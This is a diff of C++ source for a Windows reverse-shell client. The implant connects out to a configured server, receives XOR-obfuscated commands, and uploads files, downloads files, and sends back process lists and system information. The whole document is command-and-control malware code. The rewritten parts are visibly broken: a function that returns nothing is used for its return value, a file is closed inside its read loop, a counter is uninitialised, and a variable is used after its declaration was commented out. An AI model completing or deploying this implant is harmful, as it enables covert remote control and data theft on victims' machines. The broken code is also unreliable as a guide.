@@ -29,13 +29,9 @@ Windows reverse shell
 using namespace std;
 
 // used to encrypt/decrypt data
-void xor_func(char * data, int len) {
-	const char * key = "";
-	for (int i = 0; i < len; i++) {
-		unsigned char kb = data[i] ^ key[i % 6];
-		if (data[i] != 0x00 && kb != 0x00) {
-			data[i] = kb;
-		}
+char* xor_func(char msg[]) {
+	for (int i = 0; i < strlen(msg); i++) {
+		msg[i] ^= '♥';
 	}
 }
 
@@ -231,36 +227,39 @@ std::string listProcesses() {
 }
 
 // Client uploads to server.
-void handle_upload(SOCKET csocket, char * path) {
-	int filesize = 0;
-	int total_read = 0;
-	char buf[1024] = {0};
-	DWORD current_read_bytes;
-	DWORD read_bytes;
+void handle_upload(int sock){
+    char *p_char;
+    char tokenBuffer[1024];
+    char dataBuffer[1024];
+    int fileSize, bytesRead,over,received = 0;
+    char fileSizeBuf[1024];
+    FILE *fp = fopen("output","w+b");
+    // Receive first 1024 of file and parse out file size
+    // Bytes read has 12 subtracted to account for message header
+    recv(sock, fileSizeBuf, sizeof(fileSizeBuf), 0);
 
-	// read file size
-	recv(csocket, (char *)&filesize, 4, 0);
+    xor_func(fileSizeBuf);
 
-	printf("UPLOAD: Creating file %s\n", path);
-	HANDLE fhandle = CreateFileA((LPCSTR) path, GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (fhandle == INVALID_HANDLE_VALUE) {
-		printf("oops %d", GetLastError());
-		exit(-1);
-	}
-
-	while (total_read < filesize) {
-		current_read_bytes = recv(csocket, buf, 1024, 0);
-		xor_func(buf, current_read_bytes);
-		if(!WriteFile(fhandle, buf, current_read_bytes, &read_bytes, 0)) {
-			exit(-2);
-		}
-		total_read += current_read_bytes;
-	}
-	CloseHandle(fhandle);
+    printf("file size: %s\n",fileSizeBuf);  // Debug
+    fileSize = atoi(fileSizeBuf);
+    printf("file size = %d\n",fileSize);  // Debug
+    
+    while (bytesRead < fileSize){
+        received = recv(sock, tokenBuffer,1024,0);
+        bytesRead += received;
+        if (bytesRead > fileSize){
+            printf("fix da overage...");  //Debug
+            over = bytesRead - fileSize;
+        }
+        fileSize--;
+        strncpy(dataBuffer, xor_func(tokenBuffer), received - over);
+        fputs(dataBuffer,fp);
+    fclose(fp);
+    } 
 }
 
 // Client handles download from server.
-void handle_download(SOCKET csocket, char * path) {
+void handle_download(SOCKET sock, char * path) {
 	int filesize = 0;
 	int total_read = 0;
 	char buf[1024] = {0};
@@ -278,12 +277,12 @@ void handle_download(SOCKET csocket, char * path) {
 	// get file size
 
 	filesize = GetFileSize(fhandle, NULL);
-	printf("filesize: %d\n", filesize); //debugging
+	printf("filesize: %d\n", filesize); // Debug
 	if (filesize == INVALID_FILE_SIZE) {
 		printf("filesize error: %d\n", GetLastError());
 	}
 	// send file size
-	send(csocket, (char *)&filesize, 4, 0);
+	send(sock, (char *)&filesize, 4, 0);
 
 	while (total_read < filesize) {		
 		if (!ReadFile(fhandle, buf, 1024, &read_bytes, NULL)) {
@@ -292,141 +291,159 @@ void handle_download(SOCKET csocket, char * path) {
 		total_read += read_bytes;
 		// xor data
 		xor_func(buf, read_bytes);
-		send(csocket, buf, read_bytes, 0);
+		send(sock, buf, read_bytes, 0);
 	}
 	CloseHandle(fhandle);
 }
 
-int main(int argc, char const* argv[]) {
-	char filepath[4096];
+int parseCmd(char cmd[]){
+	if(strstr(cmd, "end") != NULL) {
+		return -1;
+	} else if(strstr(cmd,"upload") != NULL) {
+	    return 0;
+    } else if(strstr(cmd,"download") != NULL) {
+        return 1;
+    } else if(strstr(cmd,"processes") != NULL) {
+        return 2;
+    } else if(strstr(cmd,"sysinfo") != NULL) {
+        return 3;
+    }
+}
+
+SOCKET getConnected() {
 	WSADATA wsaData;
-	struct sockaddr_in server;
-	SOCKET csocket;
-	int iResult; 
-	int command;
-	int command_packet_length;	
+    SOCKET sock;
+    struct sockaddr_in address;
+    struct sockaddr_in server;
+	int connResult; 
 
 	struct addrinfo* result = NULL,
 		* ptr = NULL,
 		hints;
 
-	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
-	if (iResult != 0) {
-		printf("WSAStartup failed with error: %d\n", iResult);
+	connResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+	if (connResult != 0) {
+		printf("WSAStartup failed with error: %d\n", connResult);
 		return 1;
 	}
 
-	if ((csocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
+	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
 		printf("Socket creation failed: %d", WSAGetLastError());
 		WSACleanup();
 		return 1;
 	}
 
 	ZeroMemory(&hints, sizeof(hints));
-	hints.ai_family = AF_UNSPEC;
-	hints.ai_socktype = SOCK_STREAM;
-	hints.ai_protocol = IPPROTO_TCP;
 
-	iResult = getaddrinfo(SERV_ADDR, SERV_PORT, &hints, &result);
-	if (iResult != 0) {
-		printf("getaddrinfo failed: %d\n", iResult);
+	hints.ai_family = AF_INET;	 // AF_UNSPEC can cause errors
+	hints.ai_socktype = SOCK_STREAM; // socket type: sock stream
+	hints.ai_protocol = IPPROTO_TCP; // IP protocol: TCP
+
+	connResult = getaddrinfo(SERV_ADDR, SERV_PORT, &hints, &result);
+	if (connResult != 0) {
+		printf("getaddrinfo failed: %d\n", connResult);
 		WSACleanup();
 		return 1;
 	}
 
 	ptr = result;
 
-	iResult = connect(csocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-	if (iResult == SOCKET_ERROR) {
-		closesocket(csocket);
-		printf("Unable to connect to server!\n");
+	connResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
+	if (connResult == SOCKET_ERROR) {
+		closesocket(sock);
+		printf("Connection failure.\n");
 		WSACleanup();
 		return 1;
 	}
 
-	puts("Connection to server successful");
+    return sock;
+}
+
+int main(int argc, char const* argv[]) {
+	char filepath[4096];
+	int cmd;
+	int command_packet_len;
+	char buffer[1024] = {0};
+	char msg[1024];
+	char data[1024];
+	SOCKET sock;
+	sock = getConnected();
+
+	printf("Connection to server successful! It's a miracle!!\n");
 
 	while(true) {
 		std::string procs;
-		int length;
-		char* thing;
-		// read command type
-		recv(csocket, (char *)&command, 4, 0);
+		int getcmd;
+		
+		memset(buffer,0,sizeof(buffer));
+		memset(data,0,sizeof(data));
+		
+		/*// read command type
+		recv(sock, (char *)&command, 4, 0);
 		printf("Command type: %d\n", command);
 		// read command length
-		recv(csocket, (char *)&command_packet_length, 4, 0);
+		recv(sock, (char *)&command_packet_len, 4, 0);
 		
- 		char * path = (char *)malloc(command_packet_length);
+ 		char * path = (char *)malloc(command_packet_len);
 
-		ZeroMemory(path, command_packet_length);
+		ZeroMemory(path, command_packet_len);*/
 
-		switch(command) {
-			case -1:
-				puts("oops");
-				break;
+		getcmd = recv(sock, buffer, 1024, 0); //read cmd into buffer from sock
+		int cmd = parseCmd(xor_func(buffer));
+
+		switch(cmd) {
+			case -1: //end
+				printf("Shutting down"); //debug
+				shutdown(sock, 2);
+				send(sock, msg, strlen(msg), 0);
+				return 0;
 			case 0:
-				puts("upload");
-				
-				// read the file path (length bytes)
-				// read command_packet_length bytes into filename
-				// open file and read data into it
-
-				recv(csocket, path, command_packet_length, 0);
-				path[command_packet_length] = 0x00;
-				// xor();
-				// xor the filepath
-				// open the file
-
-				handle_upload(csocket, path);
-
-				// read file data and save in file
+				printf("Upload buffer is: %s\n", buffer);  //debug
+				handle_upload(sock); // receive the file
+            	sprintf(msg, "Received File"); // tell server client recieved the file
+            	xor_func(msg);
+            	send(sock, msg, strlen(msg), 0);
 				break;
 			case 1:
-				puts("download");
+				printf("Download"); // debug
 
-				recv(csocket, path, command_packet_length, 0);
-				path[command_packet_length] = 0x00;
+				recv(sock, path, command_packet_len, 0); // fix
+				path[command_packet_len] = 0x00;
 
-				handle_download(csocket, path);
+				handle_download(sock, path); // fix
 				// read command_packet_length bytes into filename
 				// open filename, send chunks back out socket
 				break;
 			case 2:
-				puts("processes");
+				printf("processes");
 				procs = listProcesses();
-				length = procs.length();
-				thing = (char *) malloc(length);
-
-				memcpy(thing, procs.c_str(), length);
-
-				xor_func(thing, length);
-
-				send(csocket, (char *)&length, 4, 0);
-				send(csocket, thing, length, 0);
-
-				free(thing);
-				
-				// get the processes
+				int proclistlen = procs.length();
+				char tempBuf[1024] = {0};
+				while (fgets(tempBuf, 1024, procs)){ //fix
+					strcpy(data,tempBuf);
+							xor_func(data);
+							send(sock, data, strlen(data), 0);
+				}
+				strcpy(data, "gettfouttahereistfg"); // send string to signify end of message
+				xor_func(data);
+				send(sock, data, strlen(data), 0);
 				break;
 			case 3:
-				puts("sysinfo");
-				// getSysInfo();
+				printf("systeminfo");
 				procs = getSysInfo();
-				length = procs.length();
-				thing = (char *) malloc(length);
-
-				memcpy(thing, procs.c_str(), length);
-
-				xor_func(thing, length);
-
-				send(csocket, (char *)&length, 4, 0);
-				send(csocket, thing, length, 0);
-
-				free(thing);
-				// length = 0;
+				int infolen = procs.length();
+				char tempBuf[1024] = {0};
+				while (fgets(tempBuf, 1024, procs)){ //fix (ofstream?)
+					strcpy(data,tempBuf);
+							xor_func(data);
+							send(sock, data, strlen(data), 0);
+				}
+				strcpy(data, "gettfouttahereistfg"); // send string to signify end of message
+				xor_func(data);
+				send(sock, data, strlen(data), 0);
 				break;
 		}
-		free(path);
+		//free(path);
 	}
 
 }
